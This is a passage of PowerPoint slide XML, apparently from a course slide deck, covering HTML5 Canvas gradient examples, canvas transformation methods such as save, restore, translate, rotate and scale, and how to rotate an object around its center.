          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Gradient Examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="144387" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{300700B5-0CF5-4FCA-AEF5-3812B496C6CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1404710"/>
            <a:ext cx="10972800" cy="5336658"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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strokeStyle</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"#000"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lineWidth</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3</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grad</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createLinearGradient</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450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350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grad</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addColorStop</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0.05</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"#ff8"</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grad</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addColorStop</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0.95</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"#f00"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fillStyle</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grad</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fillRect</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400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300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strokeRect</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400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300</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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strokeStyle</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"#000"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lineWidth</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3</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grad</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createRadialGradient</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500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400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250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12</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grad</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addColorStop</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0.05</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"#009"</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grad</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addColorStop</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0.95</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"#44f"</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fillStyle</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grad</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beginPath</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ctx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>arc</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500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350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0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Math</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</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2</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false</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fill</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C709778-116C-4547-B2CD-3AB4B6C5A43C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Canvas Transformations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35843" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F94D3F0F-1207-4491-8A7B-5A62D318E102}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>These CanvasRenderingContext2D methods affect the entire canvas rendering context</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>save() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>save the current styles, clipping path and transformations onto a stack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>restore() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>restore the last saved state from the stack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>translate(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>move origin (0, 0) to coordinates (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>rotate(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>angle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>rotate the canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t> angle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> (radians) around the current origin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>scale(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>xScale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>yScale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>scale the horizontal direction by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>xScale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> amount and vertical direction by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>yScale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> amount. Values &lt;1 reduce the unit size and values &gt;1 increase the unit size</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>transform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m21</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m22</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>dx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>dy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>multiply</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>current</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>transformation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>matrix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>current</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>values</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>setTransform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m21</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>m22</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>dx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>dy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>reset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>current</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>transformation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>matrix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>above</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>values</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" b="1"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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{612863E8-94D7-4150-A61E-1993B09F871F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Notes about Transformations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95E1A976-02BA-4A9D-B810-FBAED2C2C59D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Transformations are cumulative e.g.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx.rotate</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Math.PI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/2);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx.rotate</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Math.PI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/2); // total rotation is already</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pP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Math.PI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = 180°</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>To rotate an object around its center is:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx.save</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx.translate</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xMidPoint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yMidPoint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx.rotate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(angle);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draw the object with origin (0,0)</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in the center point of object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx.restore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="24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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6684FE3-63A7-4018-895A-8CF90611D78A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
